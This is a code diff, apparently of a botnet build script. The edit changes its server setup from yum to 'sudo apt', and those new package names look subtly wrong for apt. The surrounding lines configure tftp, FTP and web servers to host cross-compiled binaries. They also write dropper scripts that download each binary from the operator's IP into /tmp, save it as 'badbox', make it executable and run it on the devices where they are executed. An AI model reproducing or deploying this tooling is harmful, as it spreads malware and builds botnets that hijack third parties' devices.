@@ -85,11 +85,11 @@ for cc in ccs:
 print("Cross Compiling Done!")
 print("Setting up your httpd and tftp")
 
-run("yum install httpd -y")
-run("service httpd start")
-run("yum install xinetd tftp tftp-server -y")
-run("yum install vsftpd -y")
-run("service vsftpd start")
+run("sudo apt install httpd -y")
+run("sudo service httpd start")
+run("sudo apt install xinetd tftp tftp-server -y")
+run("sudo apt install vsftpd -y")
+run("sudo service vsftpd start")
 
 run('''echo -e "# default: off
 # description: The tftp server serves files using the trivial file transfer \
@@ -110,7 +110,7 @@ service tftp
         flags                   = IPv4
 }
 " > /etc/xinetd.d/tftp''')
-run("service xinetd start")
+run("sudo service xinetd start")
 
 run('''echo -e "listen=YES
 local_enable=NO
@@ -121,7 +121,7 @@ anon_max_rate=2048000
 xferlog_enable=YES
 listen_address='''+ ip +'''
 listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
-run("service vsftpd restart")
+run("sudo service vsftpd restart")
 
 for i in compileas:
     run("cp " + i + " /var/www/html")
@@ -148,8 +148,8 @@ for i in compileas:
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
     run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
 
-run("service xinetd restart")
-run("service httpd restart")
+run("sudo service xinetd restart")
+run("sudo service httpd restart")
 run('echo -e "ulimit -n 99999" >> ~/.bashrc')
 
 print("\x1b[0;32mSuccessfully cross compiled!\x1b[0m")
